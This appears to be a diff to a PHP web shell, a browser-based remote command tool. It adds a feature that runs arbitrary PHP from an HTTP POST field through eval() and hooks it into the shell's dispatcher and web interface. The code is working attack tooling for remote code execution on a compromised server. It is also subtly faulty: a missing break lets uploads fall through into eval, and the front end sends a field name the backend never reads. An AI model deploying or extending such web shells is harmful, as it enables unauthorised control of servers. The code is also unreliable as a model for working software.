@@ -138,6 +138,35 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function featureEval($code, $cwd) {
+    $stdout = array();
+
+    if (preg_match("/^\s*cd\s*$/", $code)) {
+        // pass
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $code)) {
+        chdir($cwd);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
+        chdir($match[1]);
+    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $code)) {
+        chdir($cwd);
+        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
+        return featureDownload($match[1]);
+    } else {
+        chdir($cwd);
+        ob_start();
+        eval($code);
+        $stdout = ob_get_clean();
+        if (is_string($stdout)) {
+            $stdout = explode(PHP_EOL, $stdout);
+        }
+    }
+
+    return array(
+        "stdout" => $stdout,
+        "cwd" => getcwd()
+    );
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
@@ -158,6 +187,10 @@ if (isset($_GET["feature"])) {
             break;
         case 'upload':
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+        case 'eval':
+            $code = $_POST['code'];
+            $response = featureEval($code, $_POST["cwd"]);
+            break;
     }
 
     header("Content-Type: application/json");
@@ -329,6 +362,15 @@ if (isset($_GET["feature"])) {
                 } else if (/^\s*clear\s*$/.test(command)) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
+                } else if (/^\s*eval\s+[^\s]+\s*$/.test(command)) {
+                    makeRequest("?feature=eval", {cmd: command.match(/^\s*eval\s+([^\s]+)\s*$/)[1], cwd: CWD}, function (response) {
+                        if (response.hasOwnProperty('file')) {
+                            featureDownload(response.name, response.file)
+                        } else {
+                            _insertStdout(response.stdout.join("\n"));
+                            updateCwd(response.cwd);
+                        }
+                    });
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
